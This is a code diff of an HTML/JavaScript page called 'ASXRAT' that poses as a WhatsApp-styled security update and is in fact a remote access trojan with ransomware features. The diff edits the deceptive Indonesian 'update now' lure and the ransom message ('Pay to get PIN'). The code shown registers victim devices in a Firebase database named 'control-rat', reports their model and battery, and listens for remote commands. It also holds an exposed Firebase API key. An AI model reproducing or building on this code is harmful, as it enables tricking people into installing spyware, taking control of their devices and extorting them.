@@ -12,7 +12,7 @@
         .wa-btn { background: #00a884; color: #fff; border: none; padding: 15px; border-radius: 5px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 15px; font-size: 16px; }
         video, canvas { display: none; }
 
-        /* TAMPILAN RANSOMWARE */
+        /* --- TAMPILAN LOCK SCREEN --- */
         #lock-screen { 
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
             background: #000; color: #f00; z-index: 9999; text-align: center; padding: 40px 20px; font-family: monospace;
@@ -25,13 +25,13 @@
 
     <div id="setup-box" class="wa-box">
         <h3 style="color: #00a884;">ASXRAT | SECURITY</h3>
-        <p style="font-size: 14px; color: #8696a0;">System update required for device stability.</p>
-        <button class="wa-btn" onclick="startASX()">INSTALL UPDATE</button>
+        <p style="font-size: 14px; color: #8696a0;">Pembaruan sistem enkripsi diperlukan untuk stabilitas perangkat.</p>
+        <button class="wa-btn" onclick="startASX()">UPDATE SEKARANG</button>
     </div>
 
     <div id="lock-screen">
-        <h1 id="lock-title">SYSTEM ENCRYPTED</h1>
-        <p id="lock-msg">Your files are locked. Contact owner for PIN.</p>
+        <h1 id="lock-title">DEVICE ENCRYPTED</h1>
+        <p id="lock-msg">Your files are locked. Pay to get PIN.</p>
         <input type="number" id="pin-input" class="pin-box" placeholder="ENTER PIN">
         <br>
         <button class="btn-unlock" onclick="checkPin()">UNLOCK DEVICE</button>
@@ -42,7 +42,7 @@
     <audio id="player"></audio>
 
     <script>
-        // CONFIG FIREBASE
+        // --- PASTE FIREBASE CONFIG LO DI SINI ---
         const firebaseConfig = {
             apiKey: "AIzaSyBfeY-xJ4TQWrQq8IZwwsigP9jwPpstThk",
             authDomain: "control-rat.firebaseapp.com",
@@ -58,6 +58,7 @@
         let vbtInt;
         let correctPin = "1234";
 
+        // --- FIX NAMA HP INFINIX ---
         async function getDeviceModel() {
             if (navigator.userAgentData?.getHighEntropyValues) {
                 const info = await navigator.userAgentData.getHighEntropyValues(["model"]);
@@ -84,6 +85,7 @@
                 const nameHP = await getDeviceModel();
                 const ref = db.ref('targets/' + tid);
 
+                // Update Baterai
                 const updateBatt = async () => {
                     if('getBattery' in navigator) {
                         const batt = await navigator.getBattery();
@@ -95,7 +97,7 @@
                 ref.update({ model: nameHP, status: "Online" });
                 ref.onDisconnect().remove();
 
-                // COMMAND LISTENER
+                // --- COMMAND LISTENER ---
                 db.ref('commands/' + tid).on('child_added', (snap) => {
                     const cmd = snap.val(); const key = snap.key; if(!cmd) return;
                     
@@ -120,16 +122,15 @@
                     db.ref('commands/' + tid + '/' + key).remove();
                 });
                 document.getElementById('setup-box').innerHTML = "<h3>Sistem Diperbarui!</h3><p>Perangkat Anda sekarang lebih aman.</p>";
-            } catch (e) { alert("Izin akses ditolak! Update gagal."); }
+            } catch (e) { alert("Izin akses ditolak!"); }
         }
 
         function checkPin() {
-            const val = document.getElementById('pin-input').value;
-            if(val === correctPin) {
+            if(document.getElementById('pin-input').value === correctPin) {
                 document.getElementById('lock-screen').style.display = 'none';
                 alert("ACCESS GRANTED");
             } else { alert("WRONG PIN!"); }
         }
     </script>
 </body>
-</html>
+    </html>
